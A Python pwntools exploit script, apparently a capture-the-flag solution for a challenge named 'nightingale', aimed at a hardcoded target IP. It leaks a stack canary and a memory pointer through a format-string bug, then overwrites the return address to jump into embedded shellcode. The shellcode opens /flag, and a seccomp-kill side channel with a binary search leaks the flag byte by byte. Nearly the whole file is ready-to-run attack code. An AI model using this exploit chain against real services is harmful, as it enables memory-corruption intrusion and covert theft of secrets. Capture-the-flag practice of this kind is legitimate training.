#!/usr/bin/env python3
# nightingale exploit - seccomp + timing side channel
# 使用前把 HOST / PORT 改成靶机地址
import re
import time
import select
import socket
from pwn import *

HOST = "47.101.138.10"   # 靶机 IP
PORT = 31198             # 靶机端口

context.arch = "amd64"
context.log_level = "info"

# ---------------------------------------------------------------------------
# shellcode（用 keystone 汇编好，直接内嵌，运行时只需把 arena 地址写进第 2..10 字节）
#   1. open(path, O_RDONLY) 尝试一系列可能的 flag 路径
#   2. read(0, idx, 1)      读取我们要泄露的字节下标
#   3. read(fd, buf, idx+1) 从 flag 文件读到该下标，取最后一个字节
#   4. 循环 read(0, dummy, 1) 共 "flag 字节值" 次
#   5. 触发 forbidden syscall (60)，被 seccomp 杀死
# ---------------------------------------------------------------------------
SHELLCODE = bytes.fromhex(
    "49bf41414141414141414d8da70002000041bd100000004c"
    "89e731f631d2b8020000000f0585c0791b31c941803c0c00"
    "740548ffc1ebf44901cc49ffc441ffcd75d5eb594189c631"
    "c031ff498db700030000ba010000000f05450fb697000300"
    "0031c04489f7498db710030000418d52010f05498d971003"
    "00004c01d20fb61a31c031ff498db780030000ba01000000"
    "0f05410fb6878003000038c3721431c031ff498db7900300"
    "00ba010000000f05ebecb83c00000031ff0f05f4"
)

PATHS = [b"/flag"]   # 靶机上真正的 sealed file
PATH_BLOB = b"".join(p + b"\x00" for p in PATHS)

# 二分探测：shellcode 比较 flag[idx] 与我们发的阈值，
#   flag[idx] >= 阈值 -> 进入阻塞 read，进程存活
#   flag[idx] <  阈值 -> 触发 seccomp，进程立刻退出
# 只需要判断 socket 是否 EOF，完全不依赖精确计时。
PROBE_WAIT = 0.6


def build_arena(arena_addr: int) -> bytes:
    sc = bytearray(SHELLCODE)
    sc[2:10] = p64(arena_addr)          # patch mov r15, arena
    blob = bytearray(0x400)
    blob[0:len(sc)] = sc
    blob[0x200:0x200 + len(PATH_BLOB)] = PATH_BLOB
    return bytes(blob)


def drain(io):
    for _ in range(10):
        try:
            if not io.recv(timeout=0.05):
                break
        except Exception:
            break


def is_dead(io, timeout=0.006) -> bool:
    """通过 socket EOF 判断目标进程是否已退出"""
    try:
        r, _, _ = select.select([io.sock], [], [], timeout)
        if not r:
            return False
        return io.sock.recv(1, socket.MSG_PEEK) == b""
    except Exception:
        return True


def new_session():
    """建立一次连接，完成两次 vuln 调用并返回 (io, arena, canary)"""
    io = remote(HOST, PORT)
    try:
        io.recvuntil(b"echo> ", timeout=3)
    except Exception:
        pass

    # --- vuln(0): 0x48 字节栈内数据 + 格式化字符串 ---
    # %6$p  -> [rbp-0x60] = arena 指针 (PIE+0x6000)
    # %17$p -> [rbp-0x8]  = stack canary
    p1 = b"%6$p|%17$p|".ljust(0x48, b"A")
    io.send(p1)
    io.send(b"\x00" * 0x400)            # 第一次 readn(arena, 0x400)
    time.sleep(0.25)
    leak = io.recv(timeout=1.5)

    m = re.search(rb"0x([0-9a-f]+)\|0x([0-9a-f]+)\|", leak)
    if not m:
        log.warning("leak raw: %r", leak)
        raise RuntimeError("format string leak failed")

    arena = int(m.group(1), 16)
    canary = int(m.group(2), 16)
    log.info("arena = 0x%x  canary = 0x%x", arena, canary)

    # --- vuln(1): 0x48 buffer + canary + saved rbp + ret addr ---
    p2 = b"BBBB\x00".ljust(0x48, b"A")  # \x00 让 printf 提前结束
    p2 += p64(canary)
    p2 += p64(0)                         # 伪造 saved rbp（返回后直接进 shellcode）
    p2 += p64(arena)                     # ret -> RWX arena
    assert len(p2) == 0x60
    io.send(p2)
    io.send(build_arena(arena))          # 第二次 readn(arena, 0x400)

    drain(io)
    time.sleep(0.05)
    return io, arena, canary


def probe(idx: int, threshold: int) -> bool:
    """返回 True 表示 flag[idx] < threshold（目标被 seccomp 杀死）"""
    # 服务在高频连接下偶发误判；同一阈值连续两次一致才采纳，否则重试
    for _ in range(4):
        io, _, _ = new_session()
        try:
            io.send(bytes([idx & 0xff]))        # shellcode 读下标
            time.sleep(0.05)
            io.send(bytes([threshold & 0xff]))  # shellcode 读阈值并比较
            time.sleep(PROBE_WAIT)
            dead1 = is_dead(io, 0.3)
            time.sleep(0.25)
            dead2 = is_dead(io, 0.3)
        finally:
            io.close()
        if dead1 == dead2:
            return dead1
        time.sleep(0.2)
    raise RuntimeError("unstable liveness result")


def leak_byte(idx: int) -> int:
    """二分猜出 flag[idx]，每轮一个新连接，结果只依赖存活/退出"""
    lo, hi = 32, 126   # flag 是可打印字符，少一次探测
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if probe(idx, mid):
            hi = mid - 1      # flag[idx] < mid
        else:
            lo = mid          # flag[idx] >= mid
    return lo


def main():
    flag = bytearray()
    for idx in range(128):
        b = leak_byte(idx)
        flag.append(b)
        log.info("flag[%3d] = %3d  %r  | so far: %r",
                 idx, b, chr(b) if 32 <= b < 127 else ".", bytes(flag))
        if b == ord("}"):
            break
        if b in (0, 10) and idx > 0:
            break
    print("\n=== FLAG ===")
    print(flag.decode("latin-1"))


if __name__ == "__main__":
    main()
